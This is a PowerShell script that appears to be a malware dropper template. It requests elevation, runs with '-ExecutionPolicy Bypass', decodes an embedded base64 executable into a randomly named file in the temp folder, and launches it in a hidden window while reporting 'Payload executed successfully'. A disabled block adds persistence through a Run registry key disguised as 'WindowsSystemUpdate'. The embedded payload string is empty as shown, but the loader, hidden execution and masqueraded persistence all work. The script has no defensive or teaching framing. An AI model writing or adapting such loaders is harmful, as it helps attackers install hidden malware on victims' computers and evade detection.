# Simple Admin Check
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal]::new($currentUser)).IsInRole($adminRole)

if (-not $isAdmin) {
    Write-Host "This operation requires administrator privileges."
    Write-Host "Please accept the UAC prompt to continue..."
    
    # Get the current script path
    $scriptPath = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
    
    # Restart with elevation using runas
    try {
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
        exit
    } catch {
        Write-Error "Administrator elevation failed or was canceled by user."
        exit 1
    }
}

# Write EXE to temporary location and execute (bypasses in-memory issues)
try {
    # Create a temporary file
    $tempDir = $env:TEMP
    $randomName = [System.IO.Path]::GetRandomFileName() -replace '\.',''
    $tempExePath = Join-Path $tempDir "$randomName.exe"
    
    # Decode and write the EXE
    $bytes = [System.Convert]::FromBase64String('')
    [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
    
    # Execute the file directly
    if (Test-Path $tempExePath) {
        $process = Start-Process -FilePath $tempExePath -WindowStyle Hidden -PassThru
        Write-Host "Payload executed successfully (PID: $($process.Id))"
        
        # Optional cleanup (remove if you want the file to persist)
        Start-Sleep -Seconds 2
        Remove-Item $tempExePath -Force -ErrorAction SilentlyContinue
    } else {
        Write-Error "Failed to create temporary executable"
        exit 1
    }
} catch {
    Write-Error "Failed to execute payload: $_"
    exit 1
}

# Simple persistence mechanism if enabled
if ($false) {  # Persistence disabled
    $scriptPath = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsSystemUpdate"
    
    try {
        Set-ItemProperty -Path $registryPath -Name $regName -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -ErrorAction Stop
        Write-Host "Persistence installed in registry."
    } catch {
        Write-Warning "Failed to set persistence in registry: $_"
    }
}